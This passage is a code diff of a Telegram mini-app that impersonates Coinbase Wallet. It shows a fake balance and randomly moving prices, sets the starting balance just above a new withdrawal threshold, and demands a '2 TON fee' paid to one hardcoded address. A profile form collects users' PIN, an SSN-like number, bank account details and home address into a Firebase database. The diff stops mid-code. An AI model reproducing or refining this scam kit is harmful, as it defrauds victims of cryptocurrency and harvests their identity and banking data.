@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>Coinbase</title>
+  <title>Coinbase Wallet</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
   <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
   <link href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/css/iziToast.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/js/iziToast.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/css/iziModal.min.css">
@@ -27,7 +27,7 @@
       width: 35px;
       height: 35px;
       margin: 0;
-      padding: 0px;
+      padding: 0;
       background-color: #fff;
       border-radius: 50%;
     }
@@ -77,6 +77,7 @@
     .balance-section h2 {
       font-size: 2.5rem;
       margin: 10px 0;
+      font-weight: 900;
     }
     .coin-default {
       border-radius: 16px;
@@ -180,6 +181,7 @@
     }
     .iziModal {
       width: 80%;
+      max-width: 500px;
     }
     .wallet-form {
       display: flex;
@@ -275,6 +277,8 @@
     }
     .trump_img {
       border-radius: 50%;
+      width: 50px;
+      height: 50px;
     }
     .warning {
       color: red;
@@ -347,6 +351,24 @@
       background-color: #fff;
       color: #333;
     }
+    .wallet-cell {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .btn-copy {
+      background-color: #28a745;
+      color: #fff;
+      border: none;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .btn-copy:hover {
+      background-color: #218838;
+    }
     @media (max-width: 576px) {
       .iziModal {
         width: 90%;
@@ -363,6 +385,10 @@
       }
       .depAddr {
         font-size: 0.8rem;
+      }
+      .btn-copy {
+        font-size: 0.75rem;
+        padding: 6px 8px;
       }
       #copyIt, #copyAddress {
         font-size: 1rem;
@@ -403,8 +429,12 @@
 
   <!-- Balance Section -->
   <div class="balance-section">
-    <h2 style="font-weight:900;">$25.01</h2>
-    <p><span id="wallet-address" style="color:#5a5a5ae9;font-weight:900;">0xA1Ed...3CB4E</span><i id="copyAddress" class="bx bx-copy"></i> <span class="coin-default"><span class="coin-defaults">Trump</span></span></p>
+    <h2 id="balance-display">$78.01</h2>
+    <p>
+      <span id="wallet-address" data-wallet="0xA1Ed1234567890abcdef1234567890abcdef1234">0xA1Ed...f1234</span>
+      <i id="copyAddress" class="bx bx-copy" title="Copy full address"></i>
+      <span class="coin-default"><span class="coin-defaults">Trump</span></span>
+    </p>
   </div>
 
   <!-- Action Buttons -->
@@ -414,7 +444,7 @@
       <span>Send</span>
     </div>
     <div class="action-item">
-      <button class="btn-circle open-withdraw" data-modal-id="darkModal2"><i class="far fa-arrow-alt-circle-up"></i></button>
+      <button class="btn-circle open-withdraw" data-modal-id="darkModal7"><i class="far fa-arrow-alt-circle-up"></i></button>
       <span>Withdraw</span>
     </div>
     <div class="action-item">
@@ -466,17 +496,17 @@
         <span>234.04 $</span>
       </div>
     </div>
-      <div class="crypto-card">
-    <img src="https://static.coinpaprika.com/coin/usdt-tether/logo.png" alt="USDT">
-    <div class="details">
-      <h5>USDT</h5>
-      <span>BNB Smart Chain</span>
+    <div class="crypto-card">
+      <img src="https://static.coinpaprika.com/coin/usdt-tether/logo.png" alt="USDT">
+      <div class="details">
+        <h5>USDT</h5>
+        <span>BNB Smart Chain</span>
+      </div>
+      <div class="price">
+        <p>$1.00</p>
+        <span>1.00 $</span>
+      </div>
     </div>
-    <div class="price">
-      <p>$1.00</p>
-      <span>1.00 $</span>
-    </div>
-  </div>
     <div class="crypto-card">
       <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
       <div class="details">
@@ -519,7 +549,7 @@
       <form class="wallet-form" id="send-form">
         <label for="sendWalletInput" class="hidden-label">Recipient Wallet Address</label>
         <input type="text" id="sendWalletInput" placeholder="Enter Recipient Wallet Address..." required>
-        <span class="text-warning warning">* Ensure the wallet address is correct!</span>
+        <span class="text-warning warning">Please verify that the wallet address is valid before sending to prevent loss of funds.</span>
         <label for="sendAmountInput" class="hidden-label">Send Amount</label>
         <input type="number" id="sendAmountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
         <span class="text-warning warning hide" id="insufficient-send-balance">* You do not have sufficient balance!</span>
@@ -532,8 +562,7 @@
   <!-- Dark Popup Modal 2 (Eligibility Message) -->
   <div id="darkModal2" class="iziModal" data-izimodal-title="Withdraw">
     <div class="dark-content">
-      <p id="withdraw-message">Kindly share your referral link to 15 users before attempting to withdraw from your wallet!</p>
-      <p id="eligibility-message">[You are not eligible: 2137.]</p>
+      <p id="withdraw-message">You need a minimum balance of $70.01 to withdraw.</p>
       <button class="close-btn">Close</button>
     </div>
   </div>
@@ -553,11 +582,11 @@
       <p style="text-align: left;">
         <span>Instructions & Rules:</span>
         <ol type="i" style="text-align:left;">
-          <li>Share your unique referral link with at least 15 users to unlock withdrawal eligibility.</li>
+          <li>Share your unique referral link to earn bonuses and increase your balance.</li>
           <li>Join our official Telegram channel for real-time updates, rewards, and exclusive offers.</li>
-          <li>Complete daily tasks posted on the channel to boost your earnings and increase your balance.</li>
+          <li>Complete daily tasks posted on the channel to boost your earnings.</li>
           <li>Ensure your profile details are complete and accurate to avoid delays in withdrawal processing.</li>
-          <li>Deposits and withdrawals require a 2 TON fee to the designated wallet address.</li>
+          <li>Withdrawals require a 2 TON fee to the designated wallet address.</li>
           <li>Violations of terms (e.g., fake referrals) will result in account suspension.</li>
         </ol>
       </p>
@@ -565,7 +594,7 @@
         <span>Guides:</span>
         <ul style="text-align:left;">
           <li>Use the Share button to copy your referral link and send it via Telegram or other platforms.</li>
-          <li>Monitor your referral count in the Profile section to track progress toward the 15-referral threshold.</li>
+          <li>Monitor your referral count in the Profile section to track your progress.</li>
           <li>Check the Transaction History regularly to confirm deposits, withdrawals, and fees.</li>
           <li>Contact support via the Telegram channel for issues with payments or account verification.</li>
         </ul>
@@ -605,7 +634,7 @@
       <form class="wallet-form" id="wallet-form">
         <label for="walletInput" class="hidden-label">Wallet Address</label>
         <input type="text" id="walletInput" placeholder="Enter Recipient Wallet Address..." required>
-        <span class="text-warning warning">* Ensure the wallet address exists in the app!</span>
+        <span class="text-warning warning">Please verify that the wallet address is valid before withdrawing to prevent loss of funds.</span>
         <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
         <input type="number" id="wallet_amountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
         <span class="text-warning warning hide" id="insufficient-balance">* You do not have sufficient balance!</span>
@@ -745,7 +774,6 @@
     import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
     import { getDatabase, ref, set, get, update, onValue, push } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';
 
-    // Firebase configuration
     const firebaseConfig = {
       apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
       authDomain: "coinbase-tgwallet.firebaseapp.com",
@@ -757,7 +785,6 @@
       measurementId: "G-374F8YD4KV",
     };
 
-    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
     const tg = window.Telegram.WebApp;
@@ -767,7 +794,6 @@
     const username = tg.initDataUnsafe.user?.username || "Anonymous";
     const userRef = ref(database, `users/${userId}`);
 
-    // Expose Firebase functions and variables globally
     window.firebaseFunctions = {
       database,
       userRef,
@@ -781,61 +807,129 @@
       username
     };
 
-    // Generate random string for wallet addresses
-    function generateRandomString(length) {
-      const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    function generateRandomString(length, chars) {
       let result = "";
       for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
       }
       return result;
     }
-    window.generateRandomString = generateRandomString;
 
-    // Initialize user data
-    get(userRef).then((snapshot) => {
-      if (!snapshot.exists()) {
-        const walletAddress = `0xA1Ed${generateRandomString(5)}`;
-        set(userRef, {
-          username: username,
-          fullName: "",
-          email: "",
-          pin: "",
-          ssin: "",
-          accountNumber: "",
-          bankName: "",
-          address: "",
-          balance: 25.01,
-          wallet: walletAddress,
-          referrals: 0,
-          referredBy: null,
-          settings: { theme: "dark", currency: "USD" },
-          notifications: {
-            welcome: {
-              title: "Welcome!",
-              message: "Thanks for joining Coinbase Wallet!",
-              timestamp: new Date().toISOString(),
-            },
-          },
-          transactions: {},
-        }).then(() => {
-          window.firebaseInitialized = true;
-          iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to create user profile: " + error.message, position: "topRight" });
-        });
-      } else {
-        window.firebaseInitialized = true;
+    function generateEthAddress() {
+      const hexChars = "0123456789abcdef";
+      return `0xA1Ed${generateRandomString(36, hexChars)}`;
+    }
+    window.generateEthAddress = generateEthAddress;
+
+    function truncateAddress(address) {
+      if (!address || address.length < 10) return address || "N/A";
+      return `${address.slice(0, 6)}...${address.slice(-5)}`;
+    }
+    window.truncateAddress = truncateAddress;
+
+    async function initializeUserData(attempts = 3) {
+      for (let i = 0; i < attempts; i++) {
+        try {
+          const snapshot = await get(userRef);
+          if (!snapshot.exists()) {
+            const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
+            await set(userRef, {
+              username: username,
+              fullName: "",
+              email: "",
+              pin: "",
+              ssin: "",
+              accountNumber: "",
+              bankName: "",
+              address: "",
+              balance: 78.01,
+              wallet: walletAddress,
+              referrals: 0,
+              referredBy: null,
+              settings: { theme: "dark", currency: "USD" },
+              notifications: {
+                welcome: {
+                  title: "Welcome!",
+                  message: "Thanks for joining Coinbase Wallet!",
+                  timestamp: new Date().toISOString(),
+                },
+              },
+              transactions: {},
+            });
+            window.firebaseInitialized = true;
+            iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
+            return true;
+          } else {
+            window.firebaseInitialized = true;
+            return true;
+          }
+        } catch (error) {
+          console.error(`Initialize attempt ${i + 1} failed:`, error);
+          if (i === attempts - 1) {
+            iziToast.error({ title: "Error", message: `Failed to initialize user data: ${error.message}`, position: "topRight" });
+            return false;
+          }
+          await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i)));
+        }
       }
-    }).catch((error) => {
-      iziToast.error({ title: "Error", message: "Failed to fetch user data: " + error.message, position: "topRight" });
-    });
+    }
+    initializeUserData();
   </script>
 
   <!-- Main Script -->
   <script>
-    // Fallback clipboard copy function
+    // Clear cookies for testing
+    document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+    document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+
+    // Fetch BTC price with exponential backoff
+    async function fetchBTCPrice(attempts = 3, baseDelay = 1000) {
+      for (let i = 0; i < attempts; i++) {
+        try {
+          const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd', { signal: AbortSignal.timeout(5000) });
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          const data = await response.json();
+          const price = data.bitcoin?.usd;
+          if (!price) throw new Error('Invalid BTC price data');
+          window.lastBtcPriceFetch = Date.now();
+          return price;
+        } catch (error) {
+          console.error(`BTC price fetch attempt ${i + 1} failed:`, error);
+          if (i === attempts - 1) return 60000; // Fallback
+          await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, i)));
+        }
+      }
+      return 60000;
+    }
+
+    // Update balance display based on currency
+    async function updateBalanceDisplay() {
+      try {
+        const snapshot = await window.firebaseFunctions.get(window.firebaseFunctions.userRef);
+        const userData = snapshot.val() || {};
+        const balance = userData.balance || 78.01;
+        const currency = userData.settings?.currency || "USD";
+        const $balanceDisplay = $("#balance-display");
+
+        if (currency === "BTC") {
+          const btcPrice = await fetchBTCPrice();
+          const btcBalance = balance / btcPrice;
+          $balanceDisplay.text(`${btcBalance.toFixed(6)} BTC`);
+        } else {
+          $balanceDisplay.text(`$${balance.toFixed(2)}`);
+        }
+      } catch (error) {
+        console.error('Failed to update balance display:', error);
+        iziToast.error({ title: "Error", message: "Failed to update balance display!", position: "topRight" });
+      }
+    }
+
+    // Copy to clipboard
     function copyToClipboard(text) {
+      if (!text) {
+        iziToast.error({ title: "Error", message: "No text to copy!", position: "topRight" });
+        return Promise.reject(new Error("Empty text"));
+      }
       if (navigator.clipboard && window.isSecureContext) {
         return navigator.clipboard.writeText(text);
       } else {
@@ -854,7 +948,7 @@
       }
     }
 
-    // Fallback for Toastify with dark mode
+    // Show toast notification
     function showToast(message) {
       if (typeof Toastify !== "undefined") {
         Toastify({
@@ -865,12 +959,12 @@
           style: { background: "#333" },
         }).showToast();
       } else {
-        alert(message);
-        console.warn("Toastify not loaded, falling back to alert.");
+        iziToast.info({ title: "Info", message, position: "topRight" });
+        console.warn("Toastify not loaded, using iziToast.");
       }
     }
 
-    // Wait for Firebase to initialize
+    // Wait for Firebase initialization
     function waitForFirebase(callback) {
       if (window.firebaseInitialized) {
         callback();
@@ -879,7 +973,34 @@
       }
     }
 
+    // Update crypto prices
+    const updatePrices = () => {
+      const cryptoCards = document.querySelectorAll('.crypto-card');
+      cryptoCards.forEach((card) => {
+        const priceElement = card.querySelector('.price p');
+        const currentPriceText = priceElement.textContent.replace('$', '');
+        const currentPrice = parseFloat(currentPriceText) || 0;
+        const change = (Math.random() * 0.5 - 0.25).toFixed(2);
+        const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
+        
+        priceElement.textContent = `$${newPrice}`;
+        priceElement.classList.remove('green', 'red');
+        
+        if (parseFloat(change) > 0) {
+          priceElement.classList.add('green');
+        } else if (parseFloat(change) < 0) {
+          priceElement.classList.add('red');
+        }
+        // No class added if change is 0
+      });
+    };
+
     $(document).ready(function() {
+      if (typeof $.fn.iziModal === "undefined") {
+        iziToast.error({ title: "Error", message: "iziModal failed to load!", position: "topRight" });
+        return;
+      }
+
       // Initialize modals
       $(".iziModal").each(function() {
         $(this).iziModal({
@@ -889,489 +1010,447 @@
           radius: 10,
           transitionIn: 'fadeInUp',
           transitionOut: 'fadeOutDown',
+          onOpening: function() {
+            $(this).css('display', 'block');
+          }
         });
       });
 
-      // Open welcome modal
+      // Open update modal on load
       $("#darkModal6").iziModal("open");
-      setTimeout(function() { $("#darkModal6").iziModal("close"); }, 20000);
+      setTimeout(() => $("#darkModal6").iziModal("close"), 20000);
 
       // Open modal buttons
       $(".open-btn").on("click", function() {
         const modalId = $(this).data("modal-id");
-        $("#" + modalId).iziModal("open");
+        try {
+          $("#" + modalId).iziModal("open");
+        } catch (error) {
+          showToast(`Failed to open modal: ${error.message}`);
+        }
       });
 
       // Close modal buttons
       $(".close-btn").on("click", function() {
-        $(this).closest(".iziModal").iziModal("close");
+        try {
+          $(this).closest(".iziModal").iziModal("close");
+        } catch (error) {
+          showToast(`Failed to close modal: ${error.message}`);
+        }
       });
 
-      // Generate QR code for deposit address
-      const depositAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-      new QRCode(document.getElementById("qrCodeContainer"), {
-        text: depositAddress,
-        width: 150,
-        height: 150,
-        colorDark: "#000000",
-        colorLight: "#ffffff",
-        correctLevel: QRCode.CorrectLevel.H,
-      });
+      // Update prices every 5 seconds
+      setInterval(updatePrices, 5000);
 
-      // Update crypto prices
-      const updatePrices = () => {
-        const cryptoCards = document.querySelectorAll('.crypto-card');
-        cryptoCards.forEach((card) => {
-          const priceElement = card.querySelector('.price p');
-          const currentPrice = parseFloat(priceElement.textContent.replace('$', ''));
-          const change = (Math.random() * 2 - 1).toFixed(2);
-          const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
-          priceElement.textContent = `$${newPrice}`;
-          priceElement.classList.remove('green', 'red');
-          if (change > 0) {
-            priceElement.classList.add('green');
-          } else if (change < 0) {
-            priceElement.classList.add('red');
-          }
-        });
-      };
-      setInterval(updatePrices, 2000);
-    });
+      waitForFirebase(async () => {
+        const { database, userRef, ref, set, get, update, onValue, push, userId, username } = window.firebaseFunctions || {};
+        if (!database || !onValue || !get) {
+          iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
+          return;
+        }
 
-    // Firebase-dependent code
-    waitForFirebase(function() {
-      const { database, userRef, ref, set, get, update, onValue, push, userId, username } = window.firebaseFunctions || {};
-
-      if (!database || !onValue || !get) {
-        iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
-        return;
-      }
-
-      // Copy wallet address or TON address for Anonymous user with ID 54321
-      let userWalletAddress = "0xA1Ed12345";
-      document.getElementById("copyAddress").addEventListener("click", function() {
-        if (userId === "54321") {
-          const tron_add = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-          copyToClipboard(tron_add).then(() => {
-            showToast("TON Address copied to clipboard!");
-          }).catch((error) => {
-            iziToast.error({ title: "Error", message: "Failed to copy TON address: " + error.message, position: "topRight" });
+        // Initialize QR code
+        const depositAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+        try {
+          new QRCode(document.getElementById("qrCodeContainer"), {
+            text: depositAddress,
+            width: 150,
+            height: 150,
+            colorDark: '#000000',
+            colorLight: '#ffffff',
+            correctLevel: QRCode.CorrectLevel.H,
           });
-        } else {
-          get(userRef).then((snapshot) => {
+        } catch (error) {
+          console.error("QR code generation failed:", error);
+          iziToast.error({ title: "Error", message: "Failed to generate QR code!", position: "topRight" });
+        }
+
+        let btcPrice = await fetchBTCPrice();
+        let userWalletAddress = "0xA1Ed1234567890abcdef1234567890abcdef1234";
+
+        // Refresh BTC price every 5 minutes
+        setInterval(async () => {
+          if (Date.now() - (window.lastBtcPriceFetch || 0) >= 5 * 60 * 1000) {
+            btcPrice = await fetchBTCPrice();
+            await updateBalanceDisplay();
+          }
+        }, 5 * 60 * 1000);
+
+        // Copy wallet address
+        $("#copyAddress").on("click", async () => {
+          try {
+            const snapshot = await get(userRef);
             const userData = snapshot.val() || {};
             const walletToCopy = userData.wallet || userWalletAddress;
-            copyToClipboard(walletToCopy).then(() => {
-              showToast("Wallet Address copied to clipboard!");
-            }).catch((error) => {
-              iziToast.error({ title: "Error", message: "Failed to copy wallet address: " + error.message, position: "topRight" });
-            });
-          }).catch((error) => {
-            iziToast.error({ title: "Error", message: "Failed to fetch wallet address: " + error.message, position: "topRight" });
-          });
-        }
-      });
-
-      // Copy deposit address
-      document.getElementById("copyIt").addEventListener("click", function() {
-        const tron_add = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-        copyToClipboard(tron_add).then(() => {
-          showToast("Deposit Address copied to clipboard!");
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to copy deposit address: " + error.message, position: "topRight" });
-        });
-      });
-
-      // Profile: Populate and update
-      onValue(userRef, (snapshot) => {
-        const userData = snapshot.val() || {};
-        document.getElementById("usernameInput").value = userData.username || username;
-        document.getElementById("fullNameInput").value = userData.fullName || "";
-        document.getElementById("emailInput").value = userData.email || "";
-        document.getElementById("pinInput").value = userData.pin || "";
-        document.getElementById("ssinInput").value = userData.ssin || "";
-        document.getElementById("accountNumberInput").value = userData.accountNumber || "";
-        document.getElementById("bankNameInput").value = userData.bankName || "";
-        document.getElementById("addressInput").value = userData.address || "";
-        document.getElementById("account-name").textContent = `@${userData.username || "Anonymous"}`;
-        document.getElementById("wallet-address").textContent = userData.wallet || userWalletAddress;
-        userWalletAddress = userData.wallet || userWalletAddress;
-      });
-
-      $("#profile-form").on("submit", function(e) {
-        e.preventDefault();
-        const submitButton = $("#submitProfileInfo");
-        submitButton
-          .prop("disabled", true)
-          .addClass("loading")
-          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Saving...');
-
-        const fullName = $("#fullNameInput").val().trim();
-        const email = $("#emailInput").val().trim();
-        const pin = $("#pinInput").val().trim();
-        const ssin = $("#ssinInput").val().trim();
-        const accountNumber = $("#accountNumberInput").val().trim();
-        const bankName = $("#bankNameInput").val().trim();
-        const address = $("#addressInput").val().trim();
-
-        if (!fullName) {
-          iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Save");
-          return;
-        }
-        if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
-          iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Save");
-          return;
-        }
-
-        update(userRef, {
-          fullName,
-          email,
-          pin,
-          ssin,
-          accountNumber,
-          bankName,
-          address
-        }).then(() => {
-          iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
-          $("#profile-iziModal").iziModal("close");
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to update profile: " + error.message, position: "topRight" });
-        }).finally(() => {
-          submitButton.prop("disabled", false).removeClass("loading").val("Save");
-        });
-      });
-
-      // Settings: Load and save
-      onValue(ref(database, `users/${userId}/settings`), (snapshot) => {
-        const settings = snapshot.val() || { theme: "dark", currency: "USD" };
-        document.getElementById("themeSelect").value = settings.theme;
-        document.getElementById("currencySelect").value = settings.currency;
-        document.body.className = settings.theme;
-      });
-
-      $("#settings-form").on("submit", function(e) {
-        e.preventDefault();
-        const submitButton = $("#submitSettingsInfo");
-        submitButton
-          .prop("disabled", true)
-          .addClass("loading")
-          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Saving...');
-
-        const theme = $("#themeSelect").val();
-        const currency = $("#currencySelect").val();
-        update(ref(database, `users/${userId}/settings`), { theme, currency }).then(() => {
-          document.body.className = theme;
-          iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
-          $("#settings-iziModal").iziModal("close");
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to save settings: " + error.message, position: "topRight" });
-        }).finally(() => {
-          submitButton.prop("disabled", false).removeClass("loading").val("Save");
-        });
-      });
-
-      // Update balance display
-      const balanceRef = ref(database, `users/${userId}/balance`);
-      onValue(ref(database, `users/${userId}/settings/currency`), (snapshot) => {
-        const currency = snapshot.val() || "USD";
-        const balanceElement = document.querySelector(".balance-section h2");
-        get(balanceRef).then((snapshot) => {
-          const balance = snapshot.val() || 25.01;
-          balanceElement.textContent = currency === "BTC" ? `${(balance / 60000).toFixed(6)} BTC` : `$${balance.toFixed(2)}`;
-        });
-      });
-
-      // Notifications: Fetch and display
-      onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
-        const notifications = snapshot.val();
-        const list = document.getElementById("notification-table-body");
-        list.innerHTML = "";
-        if (notifications) {
-          for (const notifId in notifications) {
-            const notif = notifications[notifId];
-            list.innerHTML += `
-              <li>
-                <strong>${notif.title}</strong><br>
-                ${notif.message}<br>
-                <small>${new Date(notif.timestamp).toLocaleString()}</small>
-              </li>
-            `;
+            await copyToClipboard(walletToCopy);
+            showToast("Wallet address copied to clipboard!");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
           }
-        } else {
-          list.innerHTML = `<li>No new notifications. Check back later!</li>`;
-        }
-      });
+        });
 
-      // Transaction History: Fetch and display
-      onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
-        const transactions = snapshot.val();
-        const tbody = document.getElementById("transaction-table-body");
-        tbody.innerHTML = "";
-        if (transactions) {
-          for (const txId in transactions) {
-            const tx = transactions[txId];
-            tbody.innerHTML += `
-              <tr>
-                <td>$${tx.amount.toFixed(2)}</td>
-                <td>${tx.wallet}</td>
-                <td>${tx.type}</td>
-                <td>${tx.status}</td>
-                <td>${new Date(tx.timestamp).toLocaleString()}</td>
-              </tr>
-            `;
+        // Copy deposit address
+        $("#copyIt").on("click", async () => {
+          try {
+            await copyToClipboard(depositAddress);
+            showToast("Deposit address copied to clipboard!");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to copy deposit address: ${error.message}`, position: "topRight" });
           }
-        } else {
-          tbody.innerHTML = `<tr><td colspan="5">No transactions found.</td></tr>`;
-        }
-      });
+        });
 
-      // Referral logic
-      const urlParams = new URLSearchParams(window.location.search);
-      const startParam = urlParams.get("tgWebAppStartParam");
-      const referrerId = startParam ? startParam.replace("ref", "") : null;
-
-      if (referrerId && referrerId !== userId) {
-        get(userRef).then((snapshot) => {
-          if (!snapshot.exists()) {
-            const walletAddress = `0xA1Ed${window.generateRandomString(5)}`;
-            set(userRef, {
-              username: username,
-              fullName: "",
-              email: "",
-              pin: "",
-              ssin: "",
-              accountNumber: "",
-              bankName: "",
-              address: "",
-              balance: 25.01,
-              wallet: walletAddress,
-              referrals: 0,
-              referredBy: referrerId,
-              settings: { theme: "dark", currency: "USD" },
-              notifications: {
-                welcome: {
-                  title: "Welcome!",
-                  message: "Thanks for joining Coinbase Wallet via referral!",
-                  timestamp: new Date().toISOString(),
-                },
-              },
-              transactions: {},
-            }).then(() => {
-              get(ref(database, `users/${referrerId}`)).then((referrerSnapshot) => {
-                if (referrerSnapshot.exists()) {
-                  const referrerData = referrerSnapshot.val();
-                  update(ref(database, `users/${referrerId}`), {
-                    referrals: (referrerData.referrals || 0) + 1,
-                    balance: (referrerData.balance || 0) + 10,
-                  }).then(() => {
-                    push(ref(database, `users/${referrerId}/transactions`), {
-                      amount: 10,
-                      wallet: "N/A",
-                      type: "Referral Bonus",
-                      status: "completed",
-                      timestamp: new Date().toISOString(),
-                    });
-                  });
-                }
+        // Share referral link
+        $("#share-button").on("click", async () => {
+          const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
+          try {
+            await copyToClipboard(referralLink);
+            $("#darkModal5").iziModal("open");
+            showToast("Referral link copied to clipboard!");
+            if (window.Telegram?.WebApp?.showShare) {
+              window.Telegram.WebApp.showShare({
+                url: referralLink,
+                text: "Join Coinbase Wallet and earn $10 per referral!"
               });
-            });
+            }
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to copy referral link: ${error.message}`, position: "topRight" });
           }
         });
-      }
 
-      // Update referral count
-      onValue(ref(database, `users`), (usersSnapshot) => {
-        if (usersSnapshot.exists()) {
-          const usersData = usersSnapshot.val();
-          let totalReferred = 0;
-          for (const key in usersData) {
-            if (usersData[key]?.referredBy === userId) {
-              totalReferred++;
-            }
+        // Update user data
+        onValue(userRef, (snapshot) => {
+          const userData = snapshot.val() || {};
+          $("#usernameInput").val(userData.username || username);
+          $("#fullNameInput").val(userData.fullName || "");
+          $("#emailInput").val(userData.email || "");
+          $("#pinInput").val(userData.pin || "");
+          $("#ssinInput").val(userData.ssin || "");
+          $("#accountNumberInput").val(userData.accountNumber || "");
+          $("#bankNameInput").val(userData.bankName || "");
+          $("#addressInput").val(userData.address || "");
+          $("#account-name").text(`@${userData.username || "Anonymous"}`);
+          const walletAddress = userData.wallet || userWalletAddress;
+          $("#wallet-address").text(window.truncateAddress(walletAddress));
+          $("#wallet-address").data("wallet", walletAddress);
+          userWalletAddress = walletAddress;
+          $("#themeSelect").val(userData.settings?.theme || "dark");
+          $("#currencySelect").val(userData.settings?.currency || "USD");
+          $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
+          updateBalanceDisplay();
+        });
+
+        // Profile form submission
+        $("#profile-form").on("submit", async (e) => {
+          e.preventDefault();
+          const submitButton = $("#submitProfileInfo");
+          submitButton
+            .prop("disabled", true)
+            .addClass("loading")
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');
+
+          const fullName = $("#fullNameInput").val().trim();
+          const email = $("#emailInput").val().trim();
+          const pin = $("#pinInput").val().trim();
+          const ssin = $("#ssinInput").val().trim();
+          const accountNumber = $("#accountNumberInput").val().trim();
+          const bankName = $("#bankNameInput").val().trim();
+          const address = $("#addressInput").val().trim();
+
+          if (!fullName) {
+            iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Save");
+            return;
           }
-          update(userRef, { referrals: totalReferred });
-        }
-      });
-
-      // Send logic
-      $("#send-form").on("submit", function(e) {
-        e.preventDefault();
-        const submitButton = $("#submitSendInfo");
-        submitButton
-          .prop("disabled", true)
-          .addClass("loading")
-          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Processing...');
-
-        const recipientWallet = $("#sendWalletInput").val().trim();
-        const amount = parseFloat($("#sendAmountInput").val().trim());
-        const walletRegex = /^0x[a-fA-F0-9]{40}$|^UQC[a-zA-Z0-9_-]{42}$/;
-
-        if (!recipientWallet || !walletRegex.test(recipientWallet)) {
